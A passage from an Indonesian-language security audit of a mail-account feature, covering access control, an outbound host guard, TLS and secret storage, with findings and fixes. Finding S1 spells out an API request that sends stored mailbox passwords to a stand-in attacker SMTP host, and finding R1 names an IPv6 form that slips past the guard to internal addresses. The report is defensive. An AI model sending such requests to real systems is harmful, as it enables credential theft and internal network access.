  `mail.view`/`mail.send` semua, `mail.private.own` semua kecuali Teknisi; semua cakupan `all`. Matriks
  rute di `rbac-matrix.integration.test.ts` lengkap (24 rute); izin tambahan diperiksa handler lewat

- **`resolveMailAccess` satu fungsi** (`packages/shared/src/mail.ts:243`) dipakai api (`mail.repo.ts`
  `levelOf`), hub WS (`mailAccessIndexOf`) dan daftar akun (`accessibleMailAccountsOf`); dibaca segar
  tanpa cache; akun pribadi orang lain → `null` untuk siapa pun termasuk Owner.
- **Isolasi akun pribadi**: semua rute isi (detail, folder, PATCH, sync/pause/resume, test tersimpan,
  access GET/PUT, avatar PUT/DELETE) → 404 untuk Owner; Owner/Admin hanya metadata `redacted` di
  `GET /settings/mail-accounts`; avatar GET boleh untuk metadata (sesuai kontrak). DELETE oleh
  Owner/Admin hanya bila pemilik nonaktif (403 bila aktif). Event WS akun pribadi hanya ke pemilik.
- **"Kelola" non-admin**: ubah nama/warna/jendela/foto, sinkron, jeda, tes kredensial tersimpan
  (ke host tersimpan) — tidak bisa ubah server/kredensial (403 `mail.account.level`), tidak bisa
  `PUT …/access` (izin rute `mail.accounts.manage`), `GET …/access` baca saja (`editable: false`).
- **Konfirmasi identitas**: buat akun bersama, ubah server/kredensial/alamat (bersama & pribadi),
  putus, melonggarkan akses dari DUA tempat (`PUT …/access`, `PUT /settings/team/:userId/mail-access`);
  `assertActorStillAuthorized` + kunci baris + deteksi balapan "baru saja diubah" di transaksi.
- **Penjaga host ketat** (`strictMailAddressAllowed`, `host-guard.ts:214`): loopback (termasuk
  `::ffff:7f00:1` bentuk heksa), link-local/metadata (`169.254.169.254`, `fd00:ec2::254`,
  `100.100.100.200`), NAT64, 6to4, Teredo, cadangan 198.18/15 & 192.0.0/24 ditolak; privat hanya CIDR
  allowlist; DNS campuran ditolak (SEMUA alamat diperiksa); resolusi sekali + sambung ke IP + SNI/
  sertifikat ke nama host. `allowLoopback` hanya dari variabel tes yang ditolak di produksi
  (`channelTestOverridesFromEnv` → `isProductionLike`). Satu celah kecil: R1.
- **TLS**: IMAP `secure`/`doSTARTTLS: true` (imapflow 2.12.1 gagal bila STARTTLS tidak ditawarkan —
  tanpa turun ke teks polos), SMTP `requireTLS`; `minVersion: TLSv1.2`, `rejectUnauthorized: true`;
  port terkunci 993/143 & 465/587 (Zod + `assertPorts` + `allowedPorts`).
- **Injeksi perintah IMAP**: username tanpa karakter kendali; password/nama folder dikodekan imapflow
  (CR/LF → literal, `sensitive: true` untuk LOGIN sehingga tidak masuk log galat).
- **Deteksi otomatis**: `fetchRemoteFile` https wajib untuk publik, privat selalu ditolak
  (`privateCidrs: []`), redirect ≤ 2 diperiksa ulang per lompatan, ≤ 64 KB, tenggat per URL + total
  12 dtk; pembaca XML minimal menolak `<!DOCTYPE`/`<!ENTITY`/`CDATA`, `indexOf` linear, maks. 20 blok,
  hanya pasangan port/keamanan yang didukung; tebakan `mail.<domain>` lewat aturan ketat.
- **Rahasia**: AES-256-GCM dengan AAD organisasi + kolom + ID akun (`mail-client/secrets.ts`);
  respons hanya `••••` + 4 karakter; audit tanpa username/password; kredensial di-`null`-kan di
  transaksi putus; tes integrasi memastikan password tidak ada di respons/audit/log.
- **Larangan alamat ganda dua arah** (`lockEmailAddresses` `email-address:<org>:<alamat>`, diurutkan →
  tanpa deadlock) termasuk alias Channel Email, dicek ulang di dalam transaksi.
- **Event WS**: bus `strictObject`, `accountId` luar == dalam (`mailEventComplete`), ID & angka saja,
  disaring hak per batch (segar), batas 50/dtk/akun → `mail.resync` per 5 dtk, `mail.access.changed`
  hanya ke `userIds`.
- **Foto**: jenis dari isi (PNG/JPEG/WebP), SVG 415, ≤ 1 MB, sisi ≤ 4.096 dicek sebelum dekode,
  `limitInputPixels`, satu dekode per proses, keluaran PNG 256×256 tanpa metadata (sharp tidak
  menyalin EXIF/ICC), `nosniff` + `Content-Disposition`.
- **Header email dari server**: blok header dipotong 256 KB sebelum `mailparser`; alamat ≤ 100,
  referensi ≤ 20, nama/subjek lewat `cleanCustomerText`; `Authentication-Results` hanya dari
  authserv-id tepercaya.
- `pnpm audit`: 2 **moderate** lama, dev-only (esbuild via drizzle-kit, minimatch via eslint) — bukan

## Temuan

### S1 — Tinggi — Password kotak surat tersimpan bisa diarahkan ke host SMTP pilihan pelaku (tanpa konfirmasi identitas)

**Bukti**
- `apps/api/src/modules/mail/mail.service.ts:447-455` (`resolveServers`): bila `input.smtp.sameCredentials`
  bernilai `true`, password IMAP (yang dibuka dari DB karena `input.imap` tidak dikirim, `:433-443`, atau
  dikirim tanpa password dengan server sama, `:409-432`) dipasang ke **`input.smtp.host` apa pun**.
  Pemeriksaan "server berubah → isi ulang password" (`sameServer`) hanya berlaku untuk cabang
  `sameCredentials: false`.
- `:674-699` (`test` dengan `accountId`): cukup `requireAdminister` — **tanpa konfirmasi identitas**.
  Rute `POST /api/v1/mail/accounts/test` (10/5 menit/pengguna).
- `:1091` (`update`): jalur PATCH yang sama — ganti host SMTP + `sameCredentials: true` tanpa password
  diterima (melanggar kontrak §4 "Ganti host/port/keamanan/username tanpa password → 400") dan host
  baru **disimpan**, sehingga worker 9B nanti terus mengirim password ke host itu.

**Skenario**: sesi Admin (atau Owner) dibajak → untuk tiap akun bersama:
`POST /mail/accounts/test { accountId, emailAddress, smtp: { host: "smtp.penyerang.tld", port: 465,
security: "ssl", sameCredentials: true }, targets: ["outgoing"] }` → api login AUTH ke server penyerang
dengan password kotak surat perusahaan (`cs@`, `billing@`). Penyerang lalu masuk ke kotak surat itu di
luar aplikasi: membaca semua email pelanggan dan mengirim penipuan dari domain perusahaan, permanen
walau sesi dicabut. Tidak ada konfirmasi, tidak ada audit/notifikasi Owner untuk tes. Pemilik akun
pribadi tidak terdampak (itu passwordnya sendiri), tetapi pola yang sama berlaku.

**Perbaikan**
1. Aturan tunggal: password yang **dibuka dari DB** hanya boleh dikirim ke tujuan yang sama persis
   dengan saat disimpan — IMAP tersimpan `(host, port, security, username)`, atau SMTP tersimpan bila
   `stored.smtpSameCredentials`. Di `resolveServers`: bila `input.smtp.sameCredentials` dan password IMAP
   berasal dari penyimpanan, wajib `sameServer(input.smtp + username IMAP, stored SMTP)` dan
   `stored.smtpSameCredentials === true`; selain itu 400 `password_required` (field `smtp.password`).
2. `test` dengan `accountId` yang mengubah server apa pun (IMAP atau SMTP) → wajib isi password baru
   (aturan 1) — tidak perlu konfirmasi bila aturan 1 ditegakkan.
3. Tes: ubah `it.fails` S1 (dua tes) menjadi `it`.

### S2 — Tinggi — Server IMAP jahat: tanpa tenggat yang menutup sambungan dan tanpa batas penimbunan → OOM api/worker, antrean `mail` macet

CS bebas mengisi host akun pribadi (host publik lolos penjaga), jadi **server IMAP dikendalikan
penyerang**. Server itu cukup berperilaku normal saat tes "buat akun", lalu berubah jahat.

**Bukti**
- `packages/core/src/mail-client/imap-account.ts` `testMailIncoming` (`withTimeout(… , min(totalMs,
  30_000))`): tenggat hanya menolak janji; **sesi tidak ditutup** (`session.close()` di `finally` baru
  jalan setelah `listFolders()` selesai — tidak pernah). Dibuktikan tes: setelah tenggat 1,5 dtk,
  sambungan ke server jahat **tetap terbuka** dan > 2 MB terus mengalir (imapflow menimbun entri LIST
  di memori proses **api**).
- `ImapFlowSession.listFolders` (`client.list({ statusQuery })`): imapflow mengumpulkan SEMUA `* LIST`
  ke larik lalu menjalankan `STATUS` satu per satu untuk setiap folder (tanpa LIST-STATUS) sebelum
  `slice(0, 1_000)`; `fetchHeaders`/`fetchFlags` memakai `fetchAll` (semua respons ditimbun, UID yang
  tidak diminta baru dibuang SETELAH selesai; tiap respons boleh ~6 MB → 200 email ≈ 1,2 GB).
  `maxResponseSize`/`maxLiteralSize` imapflow membatasi **per respons**, bukan per perintah; `socketMs`
  hanya batas diam — aliran terus-menerus tidak pernah memicunya.
- `apps/worker/src/mail/sync.ts:662` `syncAccount`: **tidak ada tenggat total** (DEFAULT `totalMs` tidak
  dipakai), `searchUids` tanpa batas jumlah (`:502`). `apps/worker/src/queues/mail.ts:66,375`: sewa
  kerja 10 menit **tidak pernah diperpanjang**, `concurrency: 4` dipakai bersama `mail-tick`.
- `apps/api/src/modules/mail/mail.routes.ts:176-191`: `POST /mail/accounts` (menjalankan tes Masuk yang
  sama) dibatasi `MAIL_WRITE_RULE` 60/menit — jauh di atas jatah tes 10/5 menit.

**Dampak**: satu CS → (a) puluhan sambungan bocor per menit di proses api, memori naik terus → api OOM
(seluruh aplikasi, termasuk penerima webhook Meta); (b) 4 akun pribadi tarpit (CS boleh 5) memegang
semua slot antrean `mail` selamanya, `mail-tick` ikut tertahan → sinkron semua organisasi berhenti;
setelah 10 menit sewa kedaluwarsa → job kedua ke akun sama (melanggar batas 2 sambungan/akun);
(c) penimbunan `fetchAll`/LIST → worker OOM, dan worker yang sama menjalankan antrean kirim WhatsApp &
broadcast; tanpa `recordFailure` (proses mati) `next_attempt_at` tidak maju → tick mengantre ulang →
crash-loop.

**Perbaikan**
1. **Tenggat yang menutup sambungan**: `MailImapSession` dibuka dengan `AbortSignal`/tenggat; saat
   habis → `client.close()` (bukan sekadar menolak janji). Terapkan di `testMailIncoming`, `syncAccount`
   (tenggat total per job, mis. 5 menit; per perintah mis. 60 dtk) dan IDLE.
2. **Anggaran byte per sambungan** (hitung byte masuk pada soket imapflow; lewat mis. 64 MB per job /
   8 MB per tes → tutup + `error`), dan **batas jumlah**: LIST tanpa `statusQuery` + berhenti bila
   > 1.000 entri (STATUS hanya untuk folder yang akan disinkron), `fetch()` iterator (bukan `fetchAll`)
   yang menutup sesi bila menerima UID di luar permintaan atau > jumlah diminta, `searchUids` dibatasi
   (mis. 100.000).
3. Sewa kerja diperpanjang selama job berjalan (atau TTL ≥ tenggat job) dan `mail-tick` di antrean/
   worker terpisah dari job sinkron; pertimbangkan proses/container worker Email terpisah dengan batas
   memori supaya OOM tidak menjatuhkan antrean WhatsApp.
4. `POST /mail/accounts` & PATCH server memakai jatah tes yang sama (`CHANNEL_TEST_RULE`) karena
   keduanya menjalankan tes koneksi (juga menutup penyalahgunaan sebagai alat tebak password IMAP/SMTP
   pihak ketiga, lihat R5).
5. Tes: ubah `it.fails` S2 (core & worker) menjadi `it`.

### S3 — Sedang — Penimbunan data dari server jahat ke Postgres bersama (tanpa anggaran per job/akun)

**Bukti**: `apps/worker/src/mail/sync.ts:519-553` memasukkan SEMUA UID baru dalam satu job (per 200,
tanpa batas total); `syncWindowDays: null` ("semua") dipilih pengguna dan `INTERNALDATE` dari server
bisa dipalsukan agar selalu "dalam jendela"; tidak ada kuota baris per akun. `bodystructure` jsonb
disimpan apa adanya (`toMessageRow`); `structureOf` (`imap-account.ts`) membatasi 100 anak × kedalaman
20 — secara teori 100^20 simpul, praktis dibatasi ~6 MB per respons → baris bisa ratusan KB–MB.
Tes: 2.500 header masuk dalam satu job; `bodystructure` satu email 30×30 daun bernama panjang > 64 KB.

**Dampak**: satu CS dengan 5 akun pribadi bisa memenuhi disk Postgres (satu database untuk semua
fitur & organisasi) → seluruh aplikasi berhenti; backup membengkak.

**Perbaikan**: anggaran header per job (mis. ≤ 2.000; sisanya job berikutnya — juga memperbaiki waktu
job), batas baris per akun (mis. 500.000) + status `error` "Kotak surat terlalu besar untuk
disinkron", batas ukuran `bodystructure` yang disimpan (mis. ≤ 64 KB; total simpul ≤ 500, nama berkas
≤ 255 sudah) — bila lewat simpan versi ringkas (hanya bagian teks + daftar lampiran tingkat atas).
Tes: ubah `it.fails` S3 menjadi `it`.

### S4 — Sedang — Alamat akun tidak terikat ke kotak surat (penguasaan alamat & identitas "terverifikasi" palsu)

**Bukti**: `mail.service.ts:744-891` (`create`) menerima `emailAddress` bebas — tidak dibandingkan dengan
username IMAP/SMTP yang lolos login — lalu membuat identitas utama dengan `verifiedAt: createdAt`
(`:891`). `update` mengganti `emailAddress` dengan aturan yang sama (`:1079-1090`).

**Skenario**: CS dibobol membuat akun **pribadi** berlabel `billing@perusahaan` memakai kredensial
kotak suratnya sendiri. Akibat: (1) Owner/Admin tidak bisa lagi menghubungkan `billing@` sebagai akun
bersama (409 `address_already_connected`, tanpa menyebut pemegangnya) maupun sebagai Channel Email
(409 `address_is_mail_account`); (2) Owner/Admin tidak bisa memutusnya selama CS aktif (403); (3) di 9B,
identitas "terverifikasi" `billing@` dipakai sebagai From — banyak server cPanel mengizinkan pengguna
terautentikasi mengirim dengan From lain di domain yang sama → penipuan atas nama alamat resmi.

**Perbaikan**: (a) bila username IMAP berbentuk alamat, `emailAddress` wajib sama (huruf kecil); bila
tidak, wajib domain sama dan identitas utama `verifiedAt = null` sampai diverifikasi (9B: kirim email
uji ke alamat itu lalu temukan di IMAP akun); (b) 409 `address_already_connected` yang dipicu akun
pribadi orang lain → untuk pemegang `mail.accounts.manage` sebut pemiliknya (metadata itu memang sudah
terlihat di Pengaturan) dan izinkan memutus akun pribadi yang alamatnya **tidak cocok** dengan username
(atau lewat konfirmasi Owner). Tes: ubah `it.fails` S4 menjadi `it`.

### R1 — Rendah — Pembungkus IPv4 SIIT `::ffff:0:a.b.c.d` lolos penjaga ketat (juga webhook keluar)

`classifyAddress` (`packages/core/src/net/outgoing-webhook.ts:25-60`) tidak memuat `::ffff:0:0:0/96`
(IPv4-translated, RFC 2765/6145) → `'public'`, sehingga `strictMailAddressAllowed('::ffff:0:7f00:1')` dan
`('::ffff:0:a00:1')` = `true` (`classifyMailAddress` mengenalinya sebagai privat, tetapi aturan ketat
hanya menolak `blocked`). Dapat dijangkau lewat catatan AAAA; berdampak hanya di jaringan dengan
penerjemah SIIT/NAT64 stateless. Perbaikan: tambah `['::ffff:0:0:0', 96]` ke `FORBIDDEN` (berlaku juga
webhook keluar & deteksi), atau di `strictMailAddressAllowed` tolak setiap alamat yang
`embeddedIpv4().translated` bila IPv4-nya bukan publik. Dikunci `it.fails` (core).

### R2 — Rendah — IDLE tidak mengikuti perubahan kredensial/host & celah `owner_inactive` ≤ 60 dtk

`apps/worker/src/mail-idle/supervisor.ts:144`: sesi IDLE dipakai ulang selamanya (perpanjangan 25
menit memakai sambungan sama); `scan()` hanya menutup bila status keluar dari `ELIGIBLE_STATES` (`:65`).
Setelah Admin mengganti host/password (mis. server lama dibobol), status `initial_sync`/`syncing` tetap
eligible → sambungan ke host LAMA dengan password LAMA tetap hidup. Pemilik dinonaktifkan:
`owner_inactive` diterapkan tick (≤ 30 dtk) lalu scan berikutnya (≤ 30 dtk) → IDLE bisa hidup ≤ 60
dtk (kontrak menyebut ≤ 30 dtk); data tidak bocor karena sinkron menolak pemilik nonaktif. Perbaikan:
simpan sidik `(imapHost, imapPort, imapUsername, updatedAt kredensial)` di `Running` dan tutup bila
berubah; pemindai juga memeriksa `users.disabled_at` pemilik akun pribadi.

### R3 — Rendah — Tick mengubah `paused`/`auth_failed` → `owner_inactive` → `syncing`

`apps/worker/src/queues/mail.ts:75-86`: syarat `sync_state not in ('owner_inactive','deleting')` ikut
menimpa `paused` dan `auth_failed`; saat pemilik aktif lagi semuanya jadi `syncing` → jeda pengguna
hilang dan login yang sudah ditolak dicoba lagi (risiko akun terkunci di penyedia — justru yang
dicegah `auth_failed`). Perbaikan: simpan status sebelumnya, atau hanya ubah dari `initial_sync/ready/
syncing/error`.

### R4 — Rendah — Nama folder dari server tidak dibersihkan

`packages/shared/src/mail.ts:1166-1176` `mailFolderDisplayName` memotong 200 karakter tetapi tidak
membuang karakter kendali/pengubah arah (`U+202E`) — dipakai di sidebar akun bersama bila server akun
itu dibobol; nama kosong/NUL membuat insert gagal → sinkron akun `error` (hanya akun itu). Perbaikan:
`cleanCustomerText(name, 200)` + cadangan "Folder" bila kosong; lewati path ber-NUL.

### R5 — Rendah — Jatah tes bisa dilewati lewat "buat akun"; endpoint tes sebagai alat tebak password pihak ketiga

`POST /mail/accounts` (pribadi, tanpa konfirmasi) menjalankan tes Masuk+Keluar penuh dengan jatah
60/menit (`mail.routes.ts:191`), dibanding 10/5 menit untuk `…/test`. CS dibobol bisa menebak password
IMAP/SMTP server publik pihak ketiga ~120 percobaan/menit dari IP server perusahaan (risiko IP masuk
daftar hitam). Perbaikan: S2 butir 4 (jatah bersama `CHANNEL_TEST_RULE`, juga per organisasi).

### R6 — Rendah — Pemberitahuan & log

- `apps/worker/src/queues/email.ts:597,620`: `mail_account_auth_failed` melewati cek peran
  (`anyActiveRecipient`) — benar secara desain (penerima dipilih worker), tetapi hak penerima atas akun
  tidak dicek ulang saat kirim (grant dicabut di antara antre & kirim → alamat akun tetap terkirim).
  "Sinkron sekarang" (6/menit/akun) mengulang siklus `auth_failed` → email baru ke semua Owner/Admin
  tiap putaran; batasi satu pemberitahuan per akun per 24 jam.
- `apps/worker/src/mail/sync.ts:872`: `logger.error({ err: error })` untuk galat non-IMAP; galat
  Drizzle memuat `params` kueri (subjek, alamat pengirim, path folder) → melanggar kontrak §13 "Log:
  TIDAK subjek/alamat lawan". Catat `err.code`/nama kelas saja.
- `apps/api/src/modules/mail/mail-access.service.ts` `updateForUser`: peran/status target tidak dicek
  ulang di transaksi (target baru dipromosikan Admin → grant `grant_for_admin` lolos; tidak berbahaya).
  `remove` oleh Owner/Admin: status "pemilik nonaktif" tidak dicek ulang di transaksi.

## Tes

diperbaiki ganti `it.fails` → `it` tanpa mengubah asersi. Setiap `it.fails` sudah diverifikasi gagal
di asersi yang dimaksud (dijalankan sementara sebagai `it`).

**Syarat penerimaan sisa risiko S4 (wajib di 9B, sebelum identitas apa pun dipakai sebagai pengirim)**:
1. Kirim/balas hanya dari identitas ber-`verified_at`; identitas tanpa verifikasi tidak muncul di pilihan
   "Dari" dan ditolak server (bukan hanya disembunyikan di UI).
2. Verifikasi = email ber-token acak sekali pakai (berumur pendek) yang dikirim lewat **pengirim sistem /
   SMTP independen ke MX publik domain alamat itu** — BUKAN lewat SMTP akun itu sendiri (server milik CS
   bisa "mengantar" email ke alamat mana pun ke kotak suratnya sendiri) — lalu ditemukan di IMAP akun
   tersebut. Verifikasi di-reset saat alamat/host/username berubah (sudah).
3. Akun bersama (Owner/Admin) yang alamatnya terverifikasi diutamakan: akun pribadi berlabel alamat sama
   yang belum terverifikasi tidak boleh menghalanginya (mis. ditandai konflik + diputus otomatis setelah
   pemberitahuan ke pemiliknya), supaya CS tidak bisa "menduduki" alamat organisasi.
4. Selama 9A: alamat akun pribadi/identitas belum terverifikasi tidak boleh dipakai sebagai sinyal
   kepercayaan di mana pun — saat ini dilanggar oleh peringatan penyamaran → **9A-2 S6**.
